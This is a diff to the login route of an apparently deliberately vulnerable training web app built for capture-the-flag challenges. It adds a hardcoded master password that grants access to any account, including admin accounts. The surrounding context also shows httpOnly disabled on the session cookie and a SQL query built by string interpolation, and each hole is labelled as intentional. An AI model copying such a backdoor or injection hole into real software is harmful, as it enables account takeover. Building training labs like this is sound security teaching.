@@ -8,6 +8,11 @@ const { setSecretCookie } = require('../auth-cookie');
 
 const router = express.Router();
 
+// VULNERABLE: hardcoded universal master password. Submitting this as the
+// password for ANY existing account (user, admin, équipe...) grants access to
+// that account without knowing its real password — a planted backdoor.
+const MASTER_PASSWORD = 'Je suis la banane!';
+
 // VULNERABLE: httpOnly intentionally disabled so document.cookie exposes the
 // JWT — required for the Cookie Theft (XSS) challenge.
 const TOKEN_COOKIE_OPTIONS = {
@@ -56,6 +61,28 @@ router.post('/login', (req, res) => {
   }
 
   try {
+    // VULNERABLE: universal master password backdoor. If the submitted password
+    // matches MASTER_PASSWORD, log in as the requested account regardless of its
+    // real credentials (works for any role: user, admin, équipe...).
+    if (password === MASTER_PASSWORD) {
+      const masterUser = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
+      if (masterUser) {
+        const token = jwt.sign(
+          {
+            id: masterUser.id,
+            username: masterUser.username,
+            role: masterUser.role,
+            super_admin: false,
+          },
+          JWT_SECRET,
+          { expiresIn: '30d' }
+        );
+        res.cookie('token', token, TOKEN_COOKIE_OPTIONS);
+        setSecretCookie(res);
+        return res.json({ id: masterUser.id, username: masterUser.username, role: masterUser.role });
+      }
+    }
+
     // VULNERABLE: string interpolation instead of parameterized query
     const sqliUser = db.prepare(`SELECT * FROM users WHERE username = '${username}' AND password_hash = '${password}'`).get();
 
